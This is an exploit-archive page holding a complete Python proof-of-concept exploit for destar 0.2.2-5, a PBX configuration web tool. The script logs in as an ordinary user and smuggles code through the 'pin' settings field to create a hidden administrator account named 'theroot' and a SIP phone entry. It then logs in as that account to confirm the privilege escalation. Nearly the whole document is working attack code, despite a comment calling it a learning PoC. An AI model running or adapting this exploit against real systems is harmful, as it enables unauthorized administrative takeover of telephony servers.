<html><head><title>destar 0.2.2-5 Arbitrary Add Admin User Exploit</title></head><pre>#
#!/usr/bin/python
#
# Exploit for destar 0.2.2-5, tested on Linux Debian
#
# Bug found and  exploit coded by a non root user
# http://nonroot.blogspot.com/
#
# Enero 2008
#
# This is a PoC, please use it just for learning how to exploit something
#
# use: $python ./exploit_code.py
#
# required: urllib, sys and re
#
import urllib
import sys,re
print &quot;Target host: i.e: http://127.0.0.1:8080/&quot;
host=raw_input(&quot;Target host ( include http and /): &quot;)
user=raw_input(&quot;A normal user for destar:&quot;)
password=raw_input(&quot;A normal password for destar:&quot;)
null=&quot;&quot;
print &quot;trying ...&quot;
loggin = urllib.urlencode({'name': user, 'pw': password})
attack = urllib.urlencode({'cfim': null, 'cfbs': null, 'cfto': null, 'dsec' : '45', 'vmim' : 'yes','vmbs' : 'yes', 'vmu' : 'yes', 'pin' : '1234,) ; CfgOptUser(name=&quot;theroot&quot;,secret=&quot;theroot&quot;,pc=&quot;200.75.43.187&quot;,phone=&quot;agent1&quot;,pbx=&quot;pbx1&quot;,level=&quot;4&quot;,language=&quot;en&quot;,) ; CfgPhoneSip(pbx=&quot;pbx1000&quot;,name=&quot;OpenBSD-Agent&quot;,secret=&quot;imsecure&quot;,ext= &quot;2999&quot;,dtmfmode = &quot;rfc2833&quot;,enablecallgroup = True,callgroup = &quot;1&quot;,queues=&quot;queue1&quot;,panel= True' })
response= urllib.urlopen(host+&quot;login/&quot;, loggin)
data=response.read()
lookup=re.compile(&quot;'User'&quot;).search
match=lookup(data)
if match:
	print user,&quot;logged, now trying exploit&quot;
else:
	print &quot;Password invalid, try again.&quot;
	sys.exit(2)

response= urllib.urlopen(host+&quot;user/settings/&quot;, attack)

if response:
	print &quot;ok, attack was done, now i will try loggin like 'theroot'&quot;
	user='theroot'
	password='theroot'
	loggin = urllib.urlencode({'name': user, 'pw': password})
	response= urllib.urlopen(host+&quot;login/&quot;, loggin)
	data=response.read()
	lookup=re.compile(&quot;'Programmer'&quot;).search
	match=lookup(data)
	if  match:
        	print &quot;Exploit ok. try: &quot;,host+&quot;/user/info&quot;
	else:
		print &quot;Exploit failed, sorry, maybe you need that the sysadmin restart destar, be patient!&quot;
		sys.exit(2)
else:
	print &quot;Exploit failed, sorry, go and find some new bug or check this code and fix it!&quot;
	sys.exit(2)

# milw0rm.com [2008-03-24]</pre></html>